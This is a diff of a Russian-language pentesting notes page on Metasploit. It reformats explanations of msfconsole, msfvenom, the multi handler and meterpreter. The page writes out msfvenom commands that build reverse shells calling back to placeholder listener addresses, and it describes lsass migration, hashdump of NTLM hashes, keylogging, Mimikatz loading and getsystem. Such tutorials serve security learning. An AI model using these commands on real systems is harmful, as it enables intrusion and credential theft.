@@ -1107,8 +1107,8 @@
   
   
     <li class="md-nav__item">
-      <a href="../curl/" class="md-nav__link">
-        curl
+      <a href="../Burp_Suite/" class="md-nav__link">
+        Burp suite
       </a>
     </li>
   
@@ -1121,8 +1121,8 @@
   
   
     <li class="md-nav__item">
-      <a href="../Burp_Suite/" class="md-nav__link">
-        Burp suite
+      <a href="../curl/" class="md-nav__link">
+        curl
       </a>
     </li>
   
@@ -2241,17 +2241,30 @@
 <h1 id="metasploit">Metasploit</h1>
 <hr />
 <p>Metasploit наиболее широко распространенный фреймворк для пентестов.
-Позволяет проводить полный цикл мероприятий по пентесту, кроме того, позволяет разрабатывать новые эксплойты.
-Из-за простоты работы с ним запрещен для использования на серьезных сертификационных экзаменах.
-Имеются две основные версии: <strong>Metasploit Pro</strong> и <strong>Metasploit framework.</strong> Первая - платная, имеет GUI и позволяет автоматизировать работу, вторая -  opensource форк с управлением через CLI.
-Metasploit представляет из себя набор инструментов выполняющие различные задачи от сканирования и получения данных до эксплуатации уязвимостей и постэксплуатационных мероприятий.
-Metasploit состоит из трёх основных частей:</p>
+Позволяет проводить полный цикл мероприятий по пентесту, кроме того, позволяет разрабатывать новые эксплойты.</p>
+<p>Имеются две основные версии: </p>
+<ul>
+<li>
+<p><strong>Metasploit Pro</strong></p>
+</li>
+<li>
+<p><strong>Metasploit framework.</strong> </p>
+</li>
+</ul>
+<p>Первая - платная, имеет GUI и позволяет автоматизировать работу.<br />
+Вторая -  opensource форк с управлением через CLI.</p>
+<p>Metasploit представляет из себя набор инструментов выполняющие различные задачи от сканирования и получения данных до эксплуатации уязвимостей и постэксплуатационных мероприятий.</p>
+<div class="admonition warning">
+<p class="admonition-title">Обрати внимание!</p>
+<p>Из-за простоты работы, Metasploit запрещен для использования на серьезных сертификационных экзаменах.</p>
+</div>
+<p>Metasploit состоит из трёх основных частей:</p>
 <ol>
 <li><strong>msfconsole</strong> - собственно сам CLI который позволяет взаимодействовать с модулями.</li>
-<li><strong>Подключаемые модули</strong> (эксплойты, сканеры и т.д.) для выполнения конкретных задач. Один из примеров - snmp_enum</li>
-<li><strong>Stand-alone tools</strong> - представляющие из себя самостоятельные программы для решения более широкого круга задач чем модули: исследование и оценка уязвимостей, пентест. Один из примеров  - msfvenom</li>
+<li><strong>Подключаемые модули</strong> - эксплойты, сканеры и т.д. предназначенные для выполнения конкретных задач.</li>
+<li><strong>Stand-alone tools</strong> - представляющие из себя самостоятельные программы (например <strong>msfvenom</strong>) для решения более широкого круга задач чем модули: исследование и оценка уязвимостей, пентест. </li>
 </ol>
-<p>Модули хранятся в /usr/share/metasploit-framework/modules и разделены на категории:</p>
+<p>Модули хранятся в <code>/usr/share/metasploit-framework/modules</code> и разделены на категории:</p>
 <ul>
 <li><strong>Auxiliary (вспомогательные модули) -</strong> здесь расположены все поддерживаемые модули: сканеры, crawlers, fuzzers</li>
 <li><strong>Encoders (модули кодировщики)</strong> - необходимы для кодирования эксплойтов и payload для уменьшения вероятности обнаружения сигнатурными методами.</li>
@@ -2264,78 +2277,110 @@ Metasploit состоит из трёх основных частей:</p>
 <ul>
 <li><strong>Singles (stageless)</strong> - Самодостаточные payloads которые выполняют определенное дейтсвие (добавляет пользователя, запускает условный notepad.exe или calc.exe) для их работы не нужны дополнительные компоненты.</li>
 <li><strong>Stagers</strong> - Payloads которые отвечают за установление соединения с целевым узлом для последующей передачи payload типа stagers. Такое разделение удобно в плане отсутствия в необходимости передачи сразу большого числа данных, что позволяет уменьшить вероятность обнаружения средствами защиты.</li>
-<li><strong>Stages</strong> - Payloads которые передаются после установления соединенения stagers'ом. </li>
-</ul>
-<p>Архитекрута Metasploit повзоляет легко определить к какому типу payloads относится какой либо конкертный:</p>
-<ul>
-<li>generic/shell_reverse_tcp -  payload типа single т.к. в имени используется символ подчеркивания (все имя в одну строку)</li>
 <li>
-<p>windows/x64/shell/reverse_tcp - payload типа stager/stage потому как разделен слэшами.</p>
+<p><strong>Stages</strong> - Payloads которые передаются после установления соединенения stagers'ом. </p>
+<p>Архитекрута Metasploit повзоляет легко определить к какому типу относится какой либо конкретный payload:</p>
+<p><code>generic/shell_reverse_tcp</code> -  payload типа single т.к. в имени используется символ подчеркивания (все имя в одну строку)</p>
+<p><code>windows/x64/shell/reverse_tcp</code> - payload типа stager/stage потому как разделен слэшами.</p>
 </li>
 <li>
-<p><strong>Post</strong>  - модули используемые после выполнения пентеста </p>
+<p><strong>Post</strong>  - модули используемые после выполнения пентеста</p>
 </li>
 </ul>
-<p>Модули ранжированы по степени потенциально негативного воздействия на систему: от самого ненадежного ManualRanking до ExcellentRanking.
-Поиск и последующий выбор необходимого модуля позволяет провести команда <strong>search</strong>
-Некоторые модули относятся к типу <strong>meterpreter</strong> и представляют из себя целые комбайны для взаимодействия с системой. Подробнее ниже.</p>
+<p>Модули ранжированы по степени потенциально негативного воздействия на систему: от самого ненадежного ManualRanking до ExcellentRanking.</p>
+<p>Поиск и последующий выбор необходимого модуля позволяет провести команда <code>search</code>, из результатов поиска нужный модуль выбирается командой <code>use module_number</code></p>
+<p>Некоторые модули относятся к типу <strong>meterpreter</strong> и представляют из себя целые комбайны для взаимодействия с системой. Подробнее ниже.</p>
 <hr />
 <h3 id="msfconsole">msfconsole</h3>
 <p>Типиный алгоритм использования msfconsole:</p>
 <ol>
-<li>Если известна информация о системе, через search ищется нужный модуль
-    a. Если разведка не проводилась, можно запустить <a href="/CyberSec/Tools/nmap">nmap</a> прям из msfconsole, или поискать модули в секции scanner/[portscan|discovery]</li>
-<li>Устанавливаются параметры выбранного модуля.</li>
-<li>Модуль запускается командной <strong>exploit</strong></li>
-<li>Если результатом работы модуля является RCE, автоматически запустится приёмник соединений (модуль <strong>exploit/multi/handler</strong>) который представляет из себя <a href="/CyberSec/Tools/netcat_nc">стабильную оболочку</a></li>
-<li>Бывают случаи, когда одновременно нужно запустить и приёмник и сессию meterpreter. В таком случае есть возможность запустить модуль, в данном случае приёмник, в фоновом режиме используя ключ <strong>exploit</strong> <strong>-j</strong></li>
+<li>
+<p>Если известна информация о системе, через <code>search</code> ищется нужный модуль</p>
+<blockquote>
+<p>Если разведка не проводилась, можно запустить <a href="/CyberSec/Tools/nmap">nmap</a> прям из msfconsole, или поискать модули в секции <code>scanner/[portscan|discovery]</code></p>
+</blockquote>
+</li>
+<li>
+<p>Устанавливаются параметры выбранного модуля.</p>
+</li>
+<li>
+<p>Модуль запускается командной <code>exploit</code></p>
+</li>
+<li>
+<p>Если результатом работы модуля является RCE, автоматически запустится приёмник соединений (модуль <code>exploit/multi/handler</code>) который представляет из себя <a href="/CyberSec/Tools/netcat_nc">стабильную оболочку</a></p>
+<blockquote>
+<p>Иногда, нужно одновременно запустить и приёмник и сессию <code>meterpreter</code>. В таком случае имеется возможность запустить модуль в фоновом режиме используя ключ <code>exploit -j</code></p>
+</blockquote>
+</li>
 </ol>
-<p>Для работы большинства модулей необходимы переменные которые задаются через <strong>set</strong> и удаляются через <strong>unset.</strong> 
-Пространстово имен переменных заданых через set ограничевается используемым модулем. 
-<strong>gset</strong> и <strong>gunset</strong> используются для расширения пространства имен до всех модулей.
-Для выбора модулей используется команда <strong>use</strong> 
-Для выхода из контекста выбранного модуля используется <strong>back</strong>
-<strong>show</strong> - группа команда для вывода информации о чем либо. к примеру, show options покажет текущую конфигурацию модуля, в случае если CLI находится в контексте этого модуля
-<strong>info</strong> - отображает полную информацию о модуле
-<strong>search</strong> - поиск модулей по ключевым словам: CVE, названия эксплойтов, имена целевых систем. Для выбора из предлагаемых выриантов, можно использовать use с порядковым номером результата. Есть возможность задавать тип модуля через type=. Другие ключи  ищи в -h
-<strong>exploit</strong> - использование модуля. Ключ -z запустит модуль в фоне. 
-<strong>check</strong> - Некоторые модули поддерживают эту команду для проверки возможности запуска на целевой системе, 
-<strong>background (ctrl + Z)</strong> - позволяет свернуть открытую сессию эксплойта.
-<strong>sessions</strong> - покажет все открытые сессии. <code>session -i  $SESSION_NUMBER</code> перейдет на указанный номер сессии, session -u $SESSION_NUMBER попробует проапгрейдить shell до meterpreter, если в качестве payload при эксплуатации был выбран простой shell.</p>
-<p>В msfconsole имеется разделение на рабочие пространства - <strong>workspaces</strong>, аналогично venv в python, для более удобной работы с несколькими проектами одновременно. 
-msfconsole поддерживает работу с БД. Для первоначальной конфигурации существует команда <strong>db_init.</strong>
+<p>Для работы большинства модулей необходимы переменные которые задаются через <code>set</code> и удаляются через <code>unset</code>.  </p>
+<blockquote>
+<p>Пространстово имен переменных заданых через <code>set</code> ограничивается используемым модулем. </p>
+</blockquote>
+<p><code>gset</code> и <code>gunset</code> используются для расширения пространства имен до всех модулей.  </p>
+<p>Для выбора модулей используется команда <code>use</code>  </p>
+<p>Для выхода из контекста выбранного модуля используется <code>back</code>  </p>
+<p><code>show</code> - группа команда для вывода информации о чем либо. к примеру, <code>show options</code> покажет текущую конфигурацию модуля, в случае если CLI находится в контексте этого модуля</p>
+<p><code>info</code> - отображает полную информацию о модуле</p>
+<p><code>search</code> - поиск модулей по ключевым словам: CVE, названия эксплойтов, имена целевых систем. Для выбора из 
+предлагаемых выриантов, можно использовать <code>use</code> с порядковым номером результата. Есть возможность задавать тип модуля через <code>type=</code>. Другие ключи  ищи в <code>-h</code></p>
+<p><code>exploit</code> - использование модуля. Ключ <code>-z</code> запустит модуль в фоне. </p>
+<p><code>check</code> - Некоторые модули поддерживают эту команду для проверки возможности запуска на целевой системе, </p>
+<p><code>background (ctrl + Z)</code> - позволяет свернуть открытую сессию эксплойта.</p>
+<p><code>sessions</code> - покажет все открытые сессии.<br />
+<code>session -i  $SESSION_NUMBER</code> перейдет на указанный номер сессии<br />
+<code>session -u $SESSION_NUMBER</code> попробует проапгрейдить shell до meterpreter, если в качестве payload при эксплуатации был выбран простой shell.</p>
+<p>В msfconsole имеется разделение на рабочие пространства - <strong>workspaces</strong>, аналогично venv в python, для более удобной работы с несколькими проектами одновременно. </p>
+<p>msfconsole поддерживает работу с БД. Для первоначальной конфигурации существует команда <code>db_init</code><br />
 После конфигурирования, становится доступен различный дополнительный функционал который можно найти в хэлпе в разделе Database Backend commands.</p>
 <hr />
 <h3 id="msfvenom">msfvenom</h3>
-<p>Инструмент (standalone tool из состава Metasploit framework) для генерации различных эксплойтов, в том числе для генерации bind и reverse shell в различных форматах (exe, py, aspx и т.д.)
-Модули из msfvenov можно генерировать и загружать напрямую(или приносить на флешке) в целевую систему, либо использовать их  в <strong>msfconsole</strong>  найдя их через <strong>search.</strong></p>
+<p>Инструмент (standalone tool из состава Metasploit framework) для генерации различных эксплойтов, в том числе для генерации bind и reverse shell в различных форматах (exe, py, aspx и т.д.)</p>
+<p>Модули из msfvenov можно генерировать и загружать напрямую (или приносить на флешке) в целевую систему, либо использовать их  в <strong>msfconsole</strong>  найдя их через <code>search.</code></p>
 <p>Стандартный синтаксис для генерации payload: 
-<strong><code>msfvenom -p &lt;payload&gt; &lt;options&gt;.</code></strong>
-В Options обычно входят формат и имя выходного файла, адрес, порт: 
-<strong><code>msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=&lt;listen-IP&gt; LPORT=&lt;listen-port&gt;</code></strong></p>
-<p>Для просмотра доступных payloads используется ключ <strong>--list payloads</strong>
-Они разделены по ОС, платформам, типам:
-Linux elf file
-<strong><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf &gt; rev_shell.elf</code></strong> </p>
+<div class="language-Bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>msfvenom<span class="w"> </span>-p<span class="w"> </span>&lt;payload&gt;<span class="w"> </span>&lt;options&gt;.
+</span></code></pre></div>
+В <code>options</code> обычно входят формат и имя выходного файла, адрес, порт: 
+<div class="language-Bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/x64/shell/reverse_tcp<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>-f<span class="w"> </span>exe<span class="w"> </span>-o<span class="w"> </span>shell.exe<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="nv">LHOST</span><span class="o">=</span>&lt;listen-IP&gt;<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span>&lt;listen-port&gt;
+</span></code></pre></div></p>
+<p>Для просмотра доступных payloads используется ключ <code>--list payloads</code>. Payloads разделены по ОС, платформам, типам:
+<div class="language-Bash highlight"><span class="filename">Linux elf file</span><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>msfvenom<span class="w"> </span>-p<span class="w"> </span>linux/x86/meterpreter/reverse_tcp<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="nv">LHOST</span><span class="o">=</span><span class="m">10</span>.10.X.X<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span>XXXX<span class="w"> </span>-f<span class="w"> </span>elf<span class="w"> </span>&gt;<span class="w"> </span>rev_shell.elf
+</span></code></pre></div></p>
 <hr />
 <h3 id="multi-hadler">multi hadler</h3>
 <p>Инструмент для получения соединений (catching) от reverse shell сгенерированных через msfvenom
-Вызывается из msfconsole командой 
-<strong><code>use exploit/multi/hadler.</code></strong>
-В качестве обязательных опций: <strong>payload, LHOST, RHOST.</strong> </p>
+Вызывается из msfconsole командой <code>use exploit/multi/hadler</code>.
+В качестве обязательных опций: <code>payload</code>, <code>LHOST</code>, <code>RHOST</code>. </p>
 <hr />
 <h3 id="meterpreter">meterpreter</h3>
-<p>Advanced payload который представляет из себя не просто shell, а настоящий комбайн поддерживающий собственные команды, скрипты. К примеру есть возможноть загрузить/скачать файл на/с целевой системы, сдампить NTLM хэши локальных учеток из SAM файла в Windows, искать файлы одной командой и т.д. Подробнее в <a href="https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter.html">документации</a>. 
-Meterpreter не создает файлов на винте, а существует только в оперативке. При этом способен мимикрировать под любой процесс. Не смотря на вышеуказанное, детектится антивирусным ПО на раз-два.</p>
+<p>Advanced payload который представляет из себя не просто shell, а настоящий комбайн поддерживающий собственные команды, скрипты. К примеру есть возможноть загрузить/скачать файл на/с целевой системы, сдампить NTLM хэши локальных учеток из SAM файла в Windows, искать файлы одной командой и т.д. Подробнее в <a href="https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter.html">документации</a>. </p>
+<div class="admonition info">
+<p class="admonition-title">К сведению</p>
+<p>Meterpreter не создает файлов на винте, а существует только в оперативке. При этом способен мимикрировать под любой процесс.<br />
+Не смотря на вышеуказанное, детектится антивирусным ПО на раз-два.</p>
+</div>
 <p>Для просмотра всех имеющихся payload имеющих типа meterpreter можно грепнуть результат команды 
-<strong><code>msfvenom --list payloads | grep meterpreter</code></strong> </p>
-<p>С учетом того, что реализация meterpreter в каждом отдельном модуле своеобразная, хорошей привычкой будет использовать <strong>help</strong> в каждой новой сессии meterpreter-a.</p>
-<p>Далее некоторые полезные команды:
-<strong><code>getuid</code></strong><code>- возвращает имя пользователя из под которого выполняется сессия.</code>
-<strong><code>migrate</code> </strong>- крайне полезная команда позволяющая внедрится в указанный процесс (задается PID процесса). Это не только позволяет скрыть выполняющийся процесс в списке процессов, но и позволит получить права пользователя того процесса в который была совершена миграция. 
-К примеру будучи внедренным в <a href="/Windows/Windows_Services">lsass.exe</a> позволит воспользоваться командой <strong><code>hashdump</code></strong> для получения NTLM хэшей локальных пользователей. Или воспользовавшись командами keystroke<em> запустить и получить результаты keylogger-a.
-</em><em><code>load</code></em><em><code>- позволяет запускать дополнительные модули/скрипты.</code>К примеру, можно передать целиком </em><em>Python, Powershell</em><em> или </em><em>kiwi (Mimikatz). </em><em>После передачи модуля, полезно снова почитать help!
-</em><em><code>getsystem</code></em><em><code>-</code>Попытается получить максимально возможные права типа </em><em>NT AUTORITHY\SYSTEM. </em>*Конечно же это работает не всегда, иначе всё было бы слишком просто)</p>
+<div class="language-Bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>msfvenom<span class="w"> </span>--list<span class="w"> </span>payloads<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>meterpreter
+</span></code></pre></div></p>
+<div class="admonition info">
+<p class="admonition-title">К сведению</p>
+<p>С учетом того, что реализация meterpreter в каждом отдельном модуле своеобразная, хорошей привычкой будет использовать <code>help</code> в каждой новой сессии meterpreter-a.</p>
+</div>
+<p>Далее некоторые полезные команды:</p>
+<p><strong>getuid</strong> - возвращает имя пользователя из под которого выполняется сессия.</p>
+<p><strong>migrate</strong> - крайне полезная команда позволяющая внедрится в указанный процесс (задается PID процесса). Это не только позволяет скрыть выполняющийся процесс в списке процессов, но и позволит получить права пользователя того процесса в который была совершена миграция. </p>
+<blockquote>
+<p>К примеру будучи внедренным в <a href="/Windows/Windows_Services">lsass.exe</a> позволит воспользоваться командой <code>hashdump</code> для получения NTLM хэшей локальных пользователей. Или воспользовавшись командами <code>keystroke</code> запустить и получить результаты keylogger-a.</p>
+</blockquote>
+<p><strong>load</strong> - позволяет запускать дополнительные модули/скрипты.</p>
+<blockquote>
+<p>К примеру, можно передать целиком Python, Powershell или kiwi (Mimikatz).<br />
+После передачи модуля, полезно снова почитать help!</p>
+</blockquote>
+<p><strong>getsystem</strong> - Попытается получить максимально возможные права типа <code>NT AUTORITHY\SYSTEM</code>. Конечно же это работает не всегда, иначе всё было бы слишком просто)</p>
 
 
 
